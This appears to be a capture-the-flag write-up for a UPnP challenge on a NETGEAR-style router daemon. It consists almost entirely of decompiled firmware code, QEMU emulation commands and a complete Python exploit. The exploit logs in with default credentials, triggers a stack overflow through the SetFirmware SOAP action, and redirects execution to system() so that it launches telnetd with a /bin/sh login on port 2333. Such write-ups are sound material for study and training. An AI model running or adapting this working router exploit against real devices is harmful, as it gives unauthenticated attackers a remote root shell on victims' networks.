# 西湖论剑-Upnp WriteUp

> 原文: https://www.ctfiot.com/110766.html
> ID: 110766


```
v11 = stristr(http_v4, "SOAPAction:");
  if ( !v11 )
    return -1;
  v12 = aDeviceinfo;                            // parentalcontrol: index == 7  DeviceConfig: index == 1
  action_v13 = v11 + 11;
  while ( 1 )                                   // travel 11 internal serverName
  {
    ServerNamePTR = v12;
    v14 = strchr(action_v13, 'r');
    v15 = v14 - action_v13;
    if ( v14 )                                  // action length <= 127
    {
      if ( v15 > 126 )
        v15 = 127;
    }
    else
    {
      v15 = 127;
    }
    strncpy((char *)&v93, action_v13, v15);
    v101 = 0;
    v16 = stristr((const char *)&v93, v12);
    v12 += 30;
    if ( v16 )
      break;
    if ( ++v8 == 11 )
    {
      serverIdx = -1;
      goto LABEL_14;
    }
  }
  serverIdx = v8;
```



```
cookie = stristr(http_v4, "Cookie:");
  v21 = stristr(http_v4, "SOAPAction:");
  if ( v21 && *(v21 - 2) == 'r' && *(v21 - 1) == 'n' && (a1 = v21, v41 = strchr(v21, *(v21 - 2)), (v42 = v41) != 0) )
  {
    *v41 = v20;
    login = stristr(a1, "service:DeviceConfig:1#SOAPLogin") == 0;// service:DeviceConfig:1#SOAPLogin
    *v42 = 'r';
  }
  else
  {
    login = 1;
  }
  if ( cookie )
    login_v23 = login;
  else
    login_v23 = 0;
  if ( !login_v23 || (v91 = strchr(cookie, 'r')) == 0 )// if logined
  {
Login_63:
    Addr_EB9C8 = 0;
    v43 = inet_ntoa((struct in_addr)int_addr_v6);
    strcpy(&Addr_EB9C8, v43);
    v44 = inet_ntoa((struct in_addr)int_addr_v6);
    v45 = (const char *)acosNvramConfig_get((int)"lan_ipaddr");
    if ( strcmp(v44, v45)
      && (strncmp(action_v13, " urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate", 0x3Au)
       && strncmp(action_v13, " "urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"", 0x3Cu)
       || serverIdx != 7)
      && (strncmp(action_v13, " urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin", 0x34u)
       && strncmp(action_v13, " "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"", 0x36u)
       || serverIdx != 1) )
    {
      v94 = 0;
      v95 = 0;
      v96 = 0;
      v97 = 0;
      v98 = 0;
      v99 = 0;
      v100 = 0;
      v93 = 0;
      memset(&s, 0, 0x80u);
      v46 = fopen("/tmp/opendns_auth.tbl", "r");  // login recoder
      if ( v46 )
      {
        getMacList((int)&v93);
        while ( fgets(&s, 128, v46) )
        {
          if ( strstr(&s, (const char *)&v93) )
          {
            fclose(v46);
            goto Dofunc_34;       // if the user`s mac_addr in the recode list then don't need check
          }
        }
        fclose(v46);
        resp_state = 401;
        return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
      }
      goto Unauthor_61;
    }
    goto Dofunc_34;
  }
  *v91 = 0;
  v24 = strstr(cookie, "sess_id=");
  if ( !v24 )
  {
    *v91 = 13;
    goto Login_63;
  }
  sessPtr = v24 + 8;
  v26 = strchr(v24 + 8, ';');
  if ( v26 )
  {
    *v26 = 0;
    v27 = v26;
    v28 = sessConfirm(sessPtr, (const char *)&v93, int_addr_v6);
    *v27 = 59;
  }
  else
  {
    v28 = sessConfirm(sessPtr, (const char *)&v93, int_addr_v6);
  }
  if ( !v28 )
    goto Unauthor_61;
Unauthor_61:
    resp_state = 401;
    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
  }
```



```
Docontrol_35:
  if ( serverIdx == -1
    || (v29 = ServerNamePTR,
        printf("%s()n", "sa_saveXMLServiceType"),
        memset(soapAction, 0, 100u),
        (v30 = stristr(http_v4, "urn:")) == 0)
    || (v31 = stristr(v30 + 4, ":")) == 0
    || (v32 = stristr(http_v4, v29)) == 0 )
  {
Unauthor_61:
    resp_state = 401;
    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
  }
  v33 = strlen(v29);
  strcat(soapAction, "urn:NETGEAR-ROUTER");
  v34 = strlen(soapAction);
  memcpy(&soapAction[v34], v31, &v32[v33] - v31);
  strcat(soapAction, ":1");
  printf("sa_service_type_buf=%srn", soapAction);
  flag_v35 = ifSSL;
  if ( ifSSL )
    flag_v35 = 1;
  v36 = processAction(flag_v35, serverIdx, http_v4, int_fd_v5, pass_v7, (char *)int_addr_v6);
  if ( v36 > 1 )
  {
    resp_state = v36;
    return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
  }
```



```
serverIdx_v6 = serverIdx;
http_v7 = http;
flag_a1 = ifssl;
fd = int_fd;
in_addr_v8 = in_addr;
printf("%s():type=%dn", "sa_processResponse", serverIdx);
switch ( serverIdx_v6 )
{
    case 0:
        if ( isNameiMatch(http_v7, 0) == 1 )
            goto LABEL_251;
        if ( isNameiMatch(http_v7, 19) == 1 )
        {
            key_idx = 19;
            flag_v12 = -1;
            goto LABEL_252;
        }
        {...}
}
/*
.data:00083B88 ; specialAction ActionList[400]
.data:00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4
.data:00083B88                                         ; DATA XREF: GotName:loc_2A91C↑o
.data:00083B88                                         ; .text:off_2A960↑o
.data:00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18
.data:00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C
.data:00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C
.data:00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13
.data:00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8
.data:00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A
.data:00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58
.data:00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21
.data:00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8
.data:00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28
.data:00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40
.data:00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F
*/
```



```
if ( key_idx != 197 )
    goto LABEL_264;
v54 = stristr(http_v7, "<Username");// login check
v55 = v54;
if ( v54 )
{
    v55 = stristr(v54, ">");
    if ( v55 )
    {
        v56 = stristr(http_v7, "</Username>");
        if ( v56 )
        {
            *v56 = 0;
            v57 = v56;
            v55 = (char *)acosNvramConfig_match("http_username", v55 + 1);// what is the original 'http_username' ?
            *v57 = '<';
        }
        else
        {
            v55 = 0;
        }
    }
}
v58 = stristr(http_v7, "<Password");
if ( !v58 )
    goto LABEL_836;
a3 = stristr(v58, ">");
if ( !a3 )
    goto LABEL_836;
v59 = stristr(http_v7, "</Password>");
if ( !v59 )
    goto LABEL_836;
*v59 = 0;
v77 = v59;
*(_DWORD *)v82 = 0;
memset(&v83, 0, 0x7Cu);
doHash(a3 + 1, v82, a3, v60);       // passwd stored in SHA256 format
v61 = acosNvramConfig_match("http_passwd_digest", v82);
v62 = v61 == 0;
if ( v61 )
    v62 = v55 == 0;
*v77 = 60;
if ( !v62 )                         // account right
{
    sub_31CDC((int)&v99, (in_addr_t)in_addr, 0);// generate cookie
    v63 = sub_32014((signed int)&v99, (int)in_addr);
    if ( v63 <= 0 )
        v63 = 503;
    resp_state = v63;
}
```



```
def SOAPLogin(http_username: str, passwd: str) -> str:
    header = {
        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"
    }
    body = '<?xml version="1.0"?>rn'
    body += '<Username>admin</Username>rn'
    body += '<Password>admin</Password>rn'

    respnd = requests.post(url=URL, headers=header, data=body)
    cookie = respnd.headers.get('Set-Cookie')
    print(cookie)
    return cookie
```



```
#!/bin/bash

qemu-system-arm -M vexpress-a9 
    -kernel vmlinuz-3.2.0-4-vexpress 
    -initrd initrd.img-3.2.0-4-vexpress 
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2
    -append "root=/dev/mmcblk0p2 console=ttyAMA0" 
    -net user,hostfwd=tcp::2222-:22,hostfwd=tcp::5555-:5555,hostfwd=tcp::5000-:5000 -net nic 
    -nographic
```



```
root@debian-armhf:~# cd squashfs-root/
root@debian-armhf:~/squashfs-root# mount --bind /proc ./proc
root@debian-armhf:~/squashfs-root# mount --bind /dev ./dev/
root@debian-armhf:~/squashfs-root# chroot . ./bin/busybox sh

BusyBox v1.7.2 (2021-08-26 10:32:44 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#/usr/sbin/upnpd
Getting upnp_turn_on
Getting upnp_turn_on
Getting lan_ipaddr
Getting upnp_turn_on
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting hw_rev
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting upnp_turn_on
open: No such file or directory
Getting upnp_turn_on
Getting lan_hwaddr
Getting lan_hwaddr
Getting upnp_turn_on
Getting lan_ipaddr
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting hw_rev
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting upnp_turn_on
open: No such file or directory
Getting upnp_turn_on
Getting lan_hwaddr
Getting lan_hwaddr
Getting upnp_turn_on
Getting lan_ipaddr
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting hw_rev
Getting upnp_turn_on
Getting friendly_name
Getting upnp_turn_on
Getting upnp_turn_on
open: No such file or directory
Getting upnp_turn_on
Getting lan_hwaddr
Getting lan_hwaddr
Getting upnp_turn_on
Getting lan_ipaddr
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Getting upnp_duration
Setting upnp_portmap_entry = 0
Getting upnp_turn_on
Getting lan_ipaddr
Getting lan_ipaddr
```



```
v130 = v7 == 0xFF13;
  dword_EC044[19 * v83] = 0xFF3B;
  firmdataDecry = (char *)malloc(0x400000u);
  v24 = (unsigned __int8 *)firmdataDecry;
  if ( !firmdataDecry )
  {
    v2 = 603;
    printf("No memory buffer %d for using in %sn", 0x400000, "sa_setFirmware");
    goto LABEL_101;
  }
  base64Decode(firmdataDecry, &v130, (unsigned __int8 *)firmdataCry);
  printf("sa_base64_decode, len=%dn", v130);
  v25 = v24[7];
  printf("SOAP firmware upgrade checking ... ");
  if ( checker(v24) )                           // stack overflow
  {
    v2 = 702;
  }
/*checker part*/
    v4 = *((unsigned __int8 *)v1 + 38);
    v5 = *((unsigned __int8 *)v1 + 5);
    v6 = *((unsigned __int8 *)v1 + 37);
    v7 = *((unsigned __int8 *)v1 + 7) + (*((unsigned __int8 *)v1 + 4) << 24) + (*((unsigned __int8 *)v1 + 6) << 8);
    v8 = *((unsigned __int8 *)v1 + 39) + (*((unsigned __int8 *)v1 + 36) << 24);
    *((_BYTE *)v1 + 36) = 0;
    *((_BYTE *)v1 + 37) = 0;
    len = v7 + (v5 << 16);
    *((_BYTE *)v1 + 38) = 0;
    *((_BYTE *)v1 + 39) = 0;
    v10 = v8 + (v4 << 8) + (v6 << 16);
    memset(&v13, 0, 0x64u);
    memcpy(&v13, v1, len);
    calculate_checksum(v3, v3, v3); 
/*
.data:000841C8 ; specialArg ArgList[]
.data:000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o
.data:000841C8                                         ; sub_F39C+60↑o ...
.data:000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r
.data:000841CC                                         ; "NewEnable"
.data:000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r
.data:000841D4                 DCD 0xFF01
.data:000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r
.data:000841D8                                         ; "NewConnectionType"
.data:000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r
.data:000841E0                 DCD 0xFF02
.data:000841E4                 DCD 0x4AB1C
.data:000841E8                 DCD 0x40

*/
```



```
2F134                 MOV             R0, SP  ; command
2F138                 BL              system
```



```
import sys, base64, requests, struct

URL = 'http://localhost:5000/soap/server_sa'

def SOAPLogin(http_username: str, passwd: str) -> str:
    header = {
        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"
    }
    body = '<?xml version="1.0"?>rn'
    body += '<Username>admin</Username>rn'
    body += '<Password>admin</Password>rn'

    respnd = requests.post(url=URL, headers=header, data=body)
    cookie = respnd.headers.get('Set-Cookie')
    print(cookie)
    return cookie

def SetFirmware(cookie: str):
    header = {
        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetFirmware",
        "Cookie": f'{cookie}'
    }
    firmData = b'*#$^' + b'x00' + b'x00' + b'x01' + b'x00'
    firmData += b'A'*144
    firmData += b'4'*4      #r4
    firmData += b'5'*4      #r5
    firmData += b'6'*4      #r6
    firmData += b'7'*4      #r7
    firmData += b'8'*4      #r8
    firmData += b'9'*4      #r9
    firmData += b'a'*4      #r10
    """ROP for system(ANY_cmd)
    2F134                 MOV             R0, SP  ; command
    2F138                 BL              system
    """
    firmData += struct.pack('<I', 0x2F134)      #PC
    firmData += b'/usr/sbin/telnetd -p2333 -l/bin/sh &'

    body = b''
    body += b'<s:Body>rn'
    body += b'<NewFirmware>%s'%(base64.b64encode(firmData))
    body += b'</NewFirmware>'
    body += b'</s:Body>rn'
    

    respn = requests.post(url=URL, headers=header, data=body)
    print(respn.text)

if __name__ == '__main__':
    cookie = SOAPLogin('admin', 'admin')
    SetFirmware(cookie)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1681895618.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1681895618.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1681895619.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/4-1681895619.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681895620.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1681895620.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1681895620.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1681895621.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1681895621.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/5-1681895621.png)